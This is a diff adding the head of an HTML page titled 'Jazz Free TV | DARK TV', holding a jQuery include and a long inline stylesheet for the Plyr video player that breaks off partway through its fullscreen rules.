@@ -1,0 +1,2354 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <title>Jazz Free TV | DARK TV</title>
+    <style>
+        @keyframes plyr-progress {
+            to {
+                background-position: 25px 0
+            }
+        }
+
+        @keyframes plyr-popup {
+            0% {
+                opacity: .5;
+                transform: translateY(10px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        @keyframes plyr-fade-in {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        .plyr {
+            -moz-osx-font-smoothing: auto;
+            -webkit-font-smoothing: subpixel-antialiased;
+            direction: ltr;
+            font-family: Avenir, avenir next, helvetica neue, segoe ui, Helvetica, Arial, sans-serif;
+            font-variant-numeric: tabular-nums;
+            font-weight: 500;
+            line-height: 1.7;
+            max-width: 100%;
+            min-width: 200px;
+            position: relative;
+            text-shadow: none;
+            transition: box-shadow .3s ease
+        }
+
+        .plyr audio,
+        .plyr video {
+            border-radius: inherit;
+            height: auto;
+            vertical-align: middle;
+            width: 100%
+        }
+
+        .plyr button {
+            font: inherit;
+            line-height: inherit;
+            width: auto
+        }
+
+        .plyr:focus {
+            outline: 0
+        }
+
+        .plyr--full-ui {
+            box-sizing: border-box
+        }
+
+        .plyr--full-ui *,
+        .plyr--full-ui ::after,
+        .plyr--full-ui ::before {
+            box-sizing: inherit
+        }
+
+        .plyr--full-ui a,
+        .plyr--full-ui button,
+        .plyr--full-ui input,
+        .plyr--full-ui label {
+            touch-action: manipulation
+        }
+
+        .plyr__badge {
+            background: #4a5764;
+            border-radius: 2px;
+            color: #fff;
+            font-size: 9px;
+            line-height: 1;
+            padding: 3px 4px
+        }
+
+        .plyr--full-ui ::-webkit-media-text-track-container {
+            display: none
+        }
+
+        .plyr__captions {
+            animation: plyr-fade-in .3s ease;
+            bottom: 0;
+            color: #fff;
+            display: none;
+            font-size: 14px;
+            left: 0;
+            padding: 10px;
+            position: absolute;
+            text-align: center;
+            transition: transform .4s ease-in-out;
+            width: 100%
+        }
+
+        .plyr__captions .plyr__caption {
+            background: rgba(0, 0, 0, .8);
+            border-radius: 2px;
+            -webkit-box-decoration-break: clone;
+            box-decoration-break: clone;
+            line-height: 185%;
+            padding: .2em .5em;
+            white-space: pre-wrap
+        }
+
+        .plyr__captions .plyr__caption div {
+            display: inline
+        }
+
+        .plyr__captions span:empty {
+            display: none
+        }
+
+        @media(min-width:480px) {
+            .plyr__captions {
+                font-size: 16px;
+                padding: 20px
+            }
+        }
+
+        @media(min-width:768px) {
+            .plyr__captions {
+                font-size: 18px
+            }
+        }
+
+        .plyr--captions-active .plyr__captions {
+            display: block
+        }
+
+        .plyr:not(.plyr--hide-controls) .plyr__controls:not(:empty)~.plyr__captions {
+            transform: translateY(-40px)
+        }
+
+        .plyr__control {
+            background: 0 0;
+            border: 0;
+            border-radius: 3px;
+            color: inherit;
+            cursor: pointer;
+            flex-shrink: 0;
+            overflow: visible;
+            padding: 7px;
+            position: relative;
+            transition: all .3s ease
+        }
+
+        .plyr__control svg {
+            display: block;
+            fill: currentColor;
+            height: 18px;
+            pointer-events: none;
+            width: 18px
+        }
+
+        .plyr__control:focus {
+            outline: 0
+        }
+
+        .plyr__control.plyr__tab-focus {
+            box-shadow: 0 0 0 5px rgba(255, 0, 0, .5);
+            outline: 0
+        }
+
+        a.plyr__control {
+            text-decoration: none
+        }
+
+        a.plyr__control::after,
+        a.plyr__control::before {
+            display: none
+        }
+
+        .plyr__control.plyr__control--pressed .icon--not-pressed,
+        .plyr__control.plyr__control--pressed .label--not-pressed,
+        .plyr__control:not(.plyr__control--pressed) .icon--pressed,
+        .plyr__control:not(.plyr__control--pressed) .label--pressed {
+            display: none
+        }
+
+        .plyr--audio .plyr__control.plyr__tab-focus,
+        .plyr--audio .plyr__control:hover,
+        .plyr--audio .plyr__control[aria-expanded=true] {
+            background: #00b3ff;
+            color: #fff
+        }
+
+        .plyr--video .plyr__control.plyr__tab-focus,
+        .plyr--video .plyr__control:hover,
+        .plyr--video .plyr__control[aria-expanded=true] {
+            background: #00b3ff;
+            color: #fff
+        }
+
+        .plyr__control--overlaid {
+            background: rgba(255, 0, 0, .8);
+            border: 0;
+            border-radius: 100%;
+            color: #fff;
+            display: none;
+            left: 50%;
+            padding: 15px;
+            position: absolute;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2
+        }
+
+        .plyr__control--overlaid svg {
+            left: 2px;
+            position: relative
+        }
+
+        .plyr__control--overlaid:focus,
+        .plyr__control--overlaid:hover {
+            background: #00b3ff
+        }
+
+        .plyr--playing .plyr__control--overlaid {
+            opacity: 0;
+            visibility: hidden
+        }
+
+        .plyr--full-ui.plyr--video .plyr__control--overlaid {
+            display: block
+        }
+
+        .plyr--full-ui ::-webkit-media-controls {
+            display: none
+        }
+
+        .plyr__controls {
+            align-items: center;
+            display: flex;
+            justify-content: flex-end;
+            text-align: center
+        }
+
+        .plyr__controls .plyr__progress__container {
+            flex: 1;
+            min-width: 0
+        }
+
+        .plyr__controls .plyr__controls__item {
+            margin-left: 2.5px
+        }
+
+        .plyr__controls .plyr__controls__item:first-child {
+            margin-left: 0;
+            margin-right: auto
+        }
+
+        .plyr__controls .plyr__controls__item.plyr__progress__container {
+            padding-left: 2.5px
+        }
+
+        .plyr__controls .plyr__controls__item.plyr__time {
+            padding: 0 5px
+        }
+
+        .plyr__controls .plyr__controls__item.plyr__progress__container:first-child,
+        .plyr__controls .plyr__controls__item.plyr__time+.plyr__time,
+        .plyr__controls .plyr__controls__item.plyr__time:first-child {
+            padding-left: 0
+        }
+
+        .plyr__controls .plyr__controls__item.plyr__volume {
+            padding-right: 5px
+        }
+
+        .plyr__controls .plyr__controls__item.plyr__volume:first-child {
+            padding-right: 0
+        }
+
+        .plyr__controls:empty {
+            display: none
+        }
+
+        .plyr--audio .plyr__controls {
+            background: #fff;
+            border-radius: inherit;
+            color: #4a5764;
+            padding: 10px
+        }
+
+        .plyr--video .plyr__controls {
+            background: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .7));
+            border-bottom-left-radius: inherit;
+            border-bottom-right-radius: inherit;
+            bottom: 0;
+            color: #fff;
+            left: 0;
+            padding: 20px 5px 5px;
+            position: absolute;
+            right: 0;
+            transition: opacity .4s ease-in-out, transform .4s ease-in-out;
+            z-index: 3
+        }
+
+        @media(min-width:480px) {
+            .plyr--video .plyr__controls {
+                padding: 35px 10px 10px
+            }
+        }
+
+        .plyr--video.plyr--hide-controls .plyr__controls {
+            opacity: 0;
+            pointer-events: none;
+            transform: translateY(100%)
+        }
+
+        .plyr [data-plyr=airplay],
+        .plyr [data-plyr=captions],
+        .plyr [data-plyr=fullscreen],
+        .plyr [data-plyr=pip] {
+            display: none
+        }
+
+        .plyr--airplay-supported [data-plyr=airplay],
+        .plyr--captions-enabled [data-plyr=captions],
+        .plyr--fullscreen-enabled [data-plyr=fullscreen],
+        .plyr--pip-supported [data-plyr=pip] {
+            display: inline-block
+        }
+
+        .plyr__menu {
+            display: flex;
+            position: relative
+        }
+
+        .plyr__menu .plyr__control svg {
+            transition: transform .3s ease
+        }
+
+        .plyr__menu .plyr__control[aria-expanded=true] svg {
+            transform: rotate(90deg)
+        }
+
+        .plyr__menu .plyr__control[aria-expanded=true] .plyr__tooltip {
+            display: none
+        }
+
+        .plyr__menu__container {
+            animation: plyr-popup .2s ease;
+            background: rgba(255, 255, 255, .9);
+            border-radius: 4px;
+            bottom: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, .15);
+            color: #4a5764;
+            font-size: 16px;
+            margin-bottom: 10px;
+            position: absolute;
+            right: -3px;
+            text-align: left;
+            white-space: nowrap;
+            z-index: 3
+        }
+
+        .plyr__menu__container>div {
+            overflow: hidden;
+            transition: height .35s cubic-bezier(.4, 0, .2, 1), width .35s cubic-bezier(.4, 0, .2, 1)
+        }
+
+        .plyr__menu__container::after {
+            border: 4px solid transparent;
+            border-top-color: rgba(255, 255, 255, .9);
+            content: '';
+            height: 0;
+            position: absolute;
+            right: 15px;
+            top: 100%;
+            width: 0
+        }
+
+        .plyr__menu__container [role=menu] {
+            padding: 7px
+        }
+
+        .plyr__menu__container [role=menuitem],
+        .plyr__menu__container [role=menuitemradio] {
+            margin-top: 2px
+        }
+
+        .plyr__menu__container [role=menuitem]:first-child,
+        .plyr__menu__container [role=menuitemradio]:first-child {
+            margin-top: 0
+        }
+
+        .plyr__menu__container .plyr__control {
+            align-items: center;
+            color: #4a5764;
+            display: flex;
+            font-size: 14px;
+            padding: 4px 11px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            width: 100%
+        }
+
+        .plyr__menu__container .plyr__control>span {
+            align-items: inherit;
+            display: flex;
+            width: 100%
+        }
+
+        .plyr__menu__container .plyr__control::after {
+            border: 4px solid transparent;
+            content: '';
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr__menu__container .plyr__control--forward {
+            padding-right: 28px
+        }
+
+        .plyr__menu__container .plyr__control--forward::after {
+            border-left-color: rgba(74, 87, 100, .8);
+            right: 5px
+        }
+
+        .plyr__menu__container .plyr__control--forward.plyr__tab-focus::after,
+        .plyr__menu__container .plyr__control--forward:hover::after {
+            border-left-color: currentColor
+        }
+
+        .plyr__menu__container .plyr__control--back {
+            font-weight: 500;
+            margin: 7px;
+            margin-bottom: 3px;
+            padding-left: 28px;
+            position: relative;
+            width: calc(100% - 14px)
+        }
+
+        .plyr__menu__container .plyr__control--back::after {
+            border-right-color: rgba(74, 87, 100, .8);
+            left: 7px
+        }
+
+        .plyr__menu__container .plyr__control--back::before {
+            background: #c1c9d1;
+            box-shadow: 0 1px 0 #fff;
+            content: '';
+            height: 1px;
+            left: 0;
+            margin-top: 4px;
+            overflow: hidden;
+            position: absolute;
+            right: 0;
+            top: 100%
+        }
+
+        .plyr__menu__container .plyr__control--back.plyr__tab-focus::after,
+        .plyr__menu__container .plyr__control--back:hover::after {
+            border-right-color: currentColor
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio] {
+            padding-left: 7px
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio]::after,
+        .plyr__menu__container .plyr__control[role=menuitemradio]::before {
+            border-radius: 100%
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio]::before {
+            background: rgba(0, 0, 0, .1);
+            content: '';
+            display: block;
+            flex-shrink: 0;
+            height: 16px;
+            margin-right: 10px;
+            transition: all .3s ease;
+            width: 16px
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio]::after {
+            background: #fff;
+            border: 0;
+            height: 6px;
+            left: 12px;
+            opacity: 0;
+            top: 50%;
+            transform: translateY(-50%) scale(0);
+            transition: transform .3s ease, opacity .3s ease;
+            width: 6px
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio][aria-checked=true]::before {
+            background: #00b3ff
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio][aria-checked=true]::after {
+            opacity: 1;
+            transform: translateY(-50%) scale(1)
+        }
+
+        .plyr__menu__container .plyr__control[role=menuitemradio].plyr__tab-focus::before,
+        .plyr__menu__container .plyr__control[role=menuitemradio]:hover::before {
+            background: rgba(0, 0, 0, .1)
+        }
+
+        .plyr__menu__container .plyr__menu__value {
+            align-items: center;
+            display: flex;
+            margin-left: auto;
+            margin-right: -5px;
+            overflow: hidden;
+            padding-left: 25px;
+            pointer-events: none
+        }
+
+        .plyr--full-ui input[type=range] {
+            -webkit-appearance: none;
+            background: 0 0;
+            border: 0;
+            border-radius: 26px;
+            color: #00b3ff;
+            display: block;
+            height: 19px;
+            margin: 0;
+            padding: 0;
+            transition: box-shadow .3s ease;
+            width: 100%
+        }
+
+        .plyr--full-ui input[type=range]::-webkit-slider-runnable-track {
+            background: 0 0;
+            border: 0;
+            border-radius: 2.5px;
+            height: 5px;
+            transition: box-shadow .3s ease;
+            -webkit-user-select: none;
+            user-select: none;
+            background-image: linear-gradient(to right, currentColor var(--value, 0), transparent var(--value, 0))
+        }
+
+        .plyr--full-ui input[type=range]::-webkit-slider-thumb {
+            background: #fff;
+            border: 0;
+            border-radius: 100%;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2);
+            height: 13px;
+            position: relative;
+            transition: all .2s ease;
+            width: 13px;
+            -webkit-appearance: none;
+            margin-top: -4px
+        }
+
+        .plyr--full-ui input[type=range]::-moz-range-track {
+            background: 0 0;
+            border: 0;
+            border-radius: 2.5px;
+            height: 5px;
+            transition: box-shadow .3s ease;
+            -moz-user-select: none;
+            user-select: none
+        }
+
+        .plyr--full-ui input[type=range]::-moz-range-thumb {
+            background: #fff;
+            border: 0;
+            border-radius: 100%;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2);
+            height: 13px;
+            position: relative;
+            transition: all .2s ease;
+            width: 13px
+        }
+
+        .plyr--full-ui input[type=range]::-moz-range-progress {
+            background: currentColor;
+            border-radius: 2.5px;
+            height: 5px
+        }
+
+        .plyr--full-ui input[type=range]::-ms-track {
+            background: 0 0;
+            border: 0;
+            border-radius: 2.5px;
+            height: 5px;
+            transition: box-shadow .3s ease;
+            -ms-user-select: none;
+            user-select: none;
+            color: transparent
+        }
+
+        .plyr--full-ui input[type=range]::-ms-fill-upper {
+            background: 0 0;
+            border: 0;
+            border-radius: 2.5px;
+            height: 5px;
+            transition: box-shadow .3s ease;
+            -ms-user-select: none;
+            user-select: none
+        }
+
+        .plyr--full-ui input[type=range]::-ms-fill-lower {
+            background: 0 0;
+            border: 0;
+            border-radius: 2.5px;
+            height: 5px;
+            transition: box-shadow .3s ease;
+            -ms-user-select: none;
+            user-select: none;
+            background: currentColor
+        }
+
+        .plyr--full-ui input[type=range]::-ms-thumb {
+            background: #fff;
+            border: 0;
+            border-radius: 100%;
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2);
+            height: 13px;
+            position: relative;
+            transition: all .2s ease;
+            width: 13px;
+            margin-top: 0
+        }
+
+        .plyr--full-ui input[type=range]::-ms-tooltip {
+            display: none
+        }
+
+        .plyr--full-ui input[type=range]:focus {
+            outline: 0
+        }
+
+        .plyr--full-ui input[type=range]::-moz-focus-outer {
+            border: 0
+        }
+
+        .plyr--full-ui input[type=range].plyr__tab-focus::-webkit-slider-runnable-track {
+            box-shadow: 0 0 0 5px rgba(0, 179, 255, .5);
+            outline: 0
+        }
+
+        .plyr--full-ui input[type=range].plyr__tab-focus::-moz-range-track {
+            box-shadow: 0 0 0 5px rgba(0, 179, 255, .5);
+            outline: 0
+        }
+
+        .plyr--full-ui input[type=range].plyr__tab-focus::-ms-track {
+            box-shadow: 0 0 0 5px rgba(0, 179, 255, .5);
+            outline: 0
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]::-webkit-slider-runnable-track {
+            background-color: rgba(255, 255, 255, .25)
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]::-moz-range-track {
+            background-color: rgba(255, 255, 255, .25)
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]::-ms-track {
+            background-color: rgba(255, 255, 255, .25)
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]:active::-webkit-slider-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(255, 255, 255, .5)
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]:active::-moz-range-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(255, 255, 255, .5)
+        }
+
+        .plyr--full-ui.plyr--video input[type=range]:active::-ms-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(255, 255, 255, .5)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]::-webkit-slider-runnable-track {
+            background-color: rgba(193, 201, 209, .66)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]::-moz-range-track {
+            background-color: rgba(193, 201, 209, .66)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]::-ms-track {
+            background-color: rgba(193, 201, 209, .66)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]:active::-webkit-slider-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(0, 0, 0, .1)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]:active::-moz-range-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(0, 0, 0, .1)
+        }
+
+        .plyr--full-ui.plyr--audio input[type=range]:active::-ms-thumb {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15), 0 0 0 1px rgba(35, 41, 47, .2), 0 0 0 3px rgba(0, 0, 0, .1)
+        }
+
+        .plyr__poster {
+            background-color: #000;
+            background-position: 50% 50%;
+            background-repeat: no-repeat;
+            background-size: contain;
+            height: 100%;
+            left: 0;
+            opacity: 0;
+            position: absolute;
+            top: 0;
+            transition: opacity .2s ease;
+            width: 100%;
+            z-index: 1
+        }
+
+        .plyr--stopped.plyr__poster-enabled .plyr__poster {
+            opacity: 1
+        }
+
+        .plyr__time {
+            font-size: 14px
+        }
+
+        .plyr__time+.plyr__time::before {
+            content: '\2044';
+            margin-right: 10px
+        }
+
+        @media(max-width:767px) {
+            .plyr__time+.plyr__time {
+                display: none
+            }
+        }
+
+        .plyr--video .plyr__time {
+            text-shadow: 0 1px 1px rgba(0, 0, 0, .15)
+        }
+
+        .plyr__tooltip {
+            background: rgba(255, 255, 255, .9);
+            border-radius: 3px;
+            bottom: 100%;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, .15);
+            color: #4a5764;
+            font-size: 14px;
+            font-weight: 500;
+            left: 50%;
+            line-height: 1.3;
+            margin-bottom: 10px;
+            opacity: 0;
+            padding: 5px 7.5px;
+            pointer-events: none;
+            position: absolute;
+            transform: translate(-50%, 10px) scale(.8);
+            transform-origin: 50% 100%;
+            transition: transform .2s .1s ease, opacity .2s .1s ease;
+            white-space: nowrap;
+            z-index: 2
+        }
+
+        .plyr__tooltip::before {
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 4px solid rgba(255, 255, 255, .9);
+            bottom: -4px;
+            content: '';
+            height: 0;
+            left: 50%;
+            position: absolute;
+            transform: translateX(-50%);
+            width: 0;
+            z-index: 2
+        }
+
+        .plyr .plyr__control.plyr__tab-focus .plyr__tooltip,
+        .plyr .plyr__control:hover .plyr__tooltip,
+        .plyr__tooltip--visible {
+            opacity: 1;
+            transform: translate(-50%, 0) scale(1)
+        }
+
+        .plyr .plyr__control:hover .plyr__tooltip {
+            z-index: 3
+        }
+
+        .plyr__controls>.plyr__control:first-child .plyr__tooltip,
+        .plyr__controls>.plyr__control:first-child+.plyr__control .plyr__tooltip {
+            left: 0;
+            transform: translate(0, 10px) scale(.8);
+            transform-origin: 0 100%
+        }
+
+        .plyr__controls>.plyr__control:first-child .plyr__tooltip::before,
+        .plyr__controls>.plyr__control:first-child+.plyr__control .plyr__tooltip::before {
+            left: 16px
+        }
+
+        .plyr__controls>.plyr__control:last-child .plyr__tooltip {
+            left: auto;
+            right: 0;
+            transform: translate(0, 10px) scale(.8);
+            transform-origin: 100% 100%
+        }
+
+        .plyr__controls>.plyr__control:last-child .plyr__tooltip::before {
+            left: auto;
+            right: 16px;
+            transform: translateX(50%)
+        }
+
+        .plyr__controls>.plyr__control:first-child .plyr__tooltip--visible,
+        .plyr__controls>.plyr__control:first-child+.plyr__control .plyr__tooltip--visible,
+        .plyr__controls>.plyr__control:first-child+.plyr__control.plyr__tab-focus .plyr__tooltip,
+        .plyr__controls>.plyr__control:first-child+.plyr__control:hover .plyr__tooltip,
+        .plyr__controls>.plyr__control:first-child.plyr__tab-focus .plyr__tooltip,
+        .plyr__controls>.plyr__control:first-child:hover .plyr__tooltip,
+        .plyr__controls>.plyr__control:last-child .plyr__tooltip--visible,
+        .plyr__controls>.plyr__control:last-child.plyr__tab-focus .plyr__tooltip,
+        .plyr__controls>.plyr__control:last-child:hover .plyr__tooltip {
+            transform: translate(0, 0) scale(1)
+        }
+
+        .plyr--video {
+            background: #000;
+            overflow: hidden
+        }
+
+        .plyr--video.plyr--menu-open {
+            overflow: visible
+        }
+
+        .plyr__video-wrapper {
+            background: #000;
+            border-radius: inherit;
+            overflow: hidden;
+            position: relative;
+            z-index: 0
+        }
+
+        .plyr__video-embed,
+        .plyr__video-wrapper--fixed-ratio {
+            height: 0;
+            padding-bottom: 56.25%
+        }
+
+        .plyr__video-embed iframe,
+        .plyr__video-wrapper--fixed-ratio video {
+            border: 0;
+            height: 100%;
+            left: 0;
+            position: absolute;
+            top: 0;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            width: 100%
+        }
+
+        .plyr--full-ui .plyr__video-embed>.plyr__video-embed__container {
+            padding-bottom: 240%;
+            position: relative;
+            transform: translateY(-38.28125%)
+        }
+
+        .plyr__progress {
+            left: 6.5px;
+            margin-right: 13px;
+            position: relative
+        }
+
+        .plyr__progress input[type=range],
+        .plyr__progress__buffer {
+            margin-left: -6.5px;
+            margin-right: -6.5px;
+            width: calc(100% + 13px)
+        }
+
+        .plyr__progress input[type=range] {
+            position: relative;
+            z-index: 2
+        }
+
+        .plyr__progress .plyr__tooltip {
+            font-size: 14px;
+            left: 0
+        }
+
+        .plyr__progress__buffer {
+            -webkit-appearance: none;
+            background: 0 0;
+            border: 0;
+            border-radius: 100px;
+            height: 5px;
+            left: 0;
+            margin-top: -2.5px;
+            padding: 0;
+            position: absolute;
+            top: 50%
+        }
+
+        .plyr__progress__buffer::-webkit-progress-bar {
+            background: 0 0
+        }
+
+        .plyr__progress__buffer::-webkit-progress-value {
+            background: currentColor;
+            border-radius: 100px;
+            min-width: 5px;
+            transition: width .2s ease
+        }
+
+        .plyr__progress__buffer::-moz-progress-bar {
+            background: currentColor;
+            border-radius: 100px;
+            min-width: 5px;
+            transition: width .2s ease
+        }
+
+        .plyr__progress__buffer::-ms-fill {
+            border-radius: 100px;
+            transition: width .2s ease
+        }
+
+        .plyr--video .plyr__progress__buffer {
+            box-shadow: 0 1px 1px rgba(0, 0, 0, .15);
+            color: rgba(255, 255, 255, .25)
+        }
+
+        .plyr--audio .plyr__progress__buffer {
+            color: rgba(193, 201, 209, .66)
+        }
+
+        .plyr--loading .plyr__progress__buffer {
+            animation: plyr-progress 1s linear infinite;
+            background-image: linear-gradient(-45deg, rgba(35, 41, 47, .6) 25%, transparent 25%, transparent 50%, rgba(255, 0, 0, .6) 50%, rgba(255, 0, 0, .6) 75%, transparent 75%, transparent);
+            background-repeat: repeat-x;
+            background-size: 25px 25px;
+            color: transparent
+        }
+
+        .plyr--video.plyr--loading .plyr__progress__buffer {
+            background-color: rgba(255, 0, 0, .25)
+        }
+
+        .plyr--audio.plyr--loading .plyr__progress__buffer {
+            background-color: rgba(255, 0, 0, .66)
+        }
+
+        .plyr__volume {
+            align-items: center;
+            display: flex;
+            flex: 1;
+            position: relative
+        }
+
+        .plyr__volume input[type=range] {
+            margin-left: 5px;
+            position: relative;
+            z-index: 2
+        }
+
+        @media(min-width:480px) {
+            .plyr__volume {
+                max-width: 90px
+            }
+        }
+
+        @media(min-width:768px) {
+            .plyr__volume {
+                max-width: 110px
+            }
+        }
+
+        .plyr--is-ios .plyr__volume {
+            display: none !important
+        }
+
+        .plyr--is-ios.plyr--vimeo [data-plyr=mute] {
+            display: none !important
+        }
+
+        .plyr:-webkit-full-screen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:-ms-fullscreen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:fullscreen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:-webkit-full-screen video {
+            height: 100%
+        }
+
+        .plyr:-ms-fullscreen video {
+            height: 100%
+        }
+
+        .plyr:fullscreen video {
+            height: 100%
+        }
+
+        .plyr:-webkit-full-screen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:-ms-fullscreen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:fullscreen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:-webkit-full-screen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:-ms-fullscreen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:fullscreen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:-webkit-full-screen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:-ms-fullscreen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:fullscreen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:-webkit-full-screen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:-ms-fullscreen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:fullscreen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:-webkit-full-screen.plyr--hide-controls {
+            cursor: none
+        }
+
+        .plyr:-ms-fullscreen.plyr--hide-controls {
+            cursor: none
+        }
+
+        .plyr:fullscreen.plyr--hide-controls {
+            cursor: none
+        }
+
+        @media(min-width:1024px) {
+            .plyr:-webkit-full-screen .plyr__captions {
+                font-size: 21px
+            }
+
+            .plyr:-ms-fullscreen .plyr__captions {
+                font-size: 21px
+            }
+
+            .plyr:fullscreen .plyr__captions {
+                font-size: 21px
+            }
+        }
+
+        .plyr:-webkit-full-screen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:-webkit-full-screen video {
+            height: 100%
+        }
+
+        .plyr:-webkit-full-screen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:-webkit-full-screen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:-webkit-full-screen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:-webkit-full-screen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:-webkit-full-screen.plyr--hide-controls {
+            cursor: none
+        }
+
+        @media(min-width:1024px) {
+            .plyr:-webkit-full-screen .plyr__captions {
+                font-size: 21px
+            }
+        }
+
+        .plyr:-moz-full-screen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:-moz-full-screen video {
+            height: 100%
+        }
+
+        .plyr:-moz-full-screen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:-moz-full-screen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:-moz-full-screen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:-moz-full-screen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:-moz-full-screen.plyr--hide-controls {
+            cursor: none
+        }
+
+        @media(min-width:1024px) {
+            .plyr:-moz-full-screen .plyr__captions {
+                font-size: 21px
+            }
+        }
+
+        .plyr:-ms-fullscreen {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%
+        }
+
+        .plyr:-ms-fullscreen video {
+            height: 100%
+        }
+
+        .plyr:-ms-fullscreen .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr:-ms-fullscreen.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
+            transform: translateY(-50%)
+        }
+
+        .plyr:-ms-fullscreen .plyr__control .icon--exit-fullscreen {
+            display: block
+        }
+
+        .plyr:-ms-fullscreen .plyr__control .icon--exit-fullscreen+svg {
+            display: none
+        }
+
+        .plyr:-ms-fullscreen.plyr--hide-controls {
+            cursor: none
+        }
+
+        @media(min-width:1024px) {
+            .plyr:-ms-fullscreen .plyr__captions {
+                font-size: 21px
+            }
+        }
+
+        .plyr--fullscreen-fallback {
+            background: #000;
+            border-radius: 0 !important;
+            height: 100%;
+            margin: 0;
+            width: 100%;
+            bottom: 0;
+            left: 0;
+            position: fixed;
+            right: 0;
+            top: 0;
+            z-index: 10000000
+        }
+
+        .plyr--fullscreen-fallback video {
+            height: 100%
+        }
+
+        .plyr--fullscreen-fallback .plyr__video-wrapper {
+            height: 100%;
+            position: static
+        }
+
+        .plyr--fullscreen-fallback.plyr--vimeo .plyr__video-wrapper {
+            height: 0;
+            position: relative;
+            top: 50%;
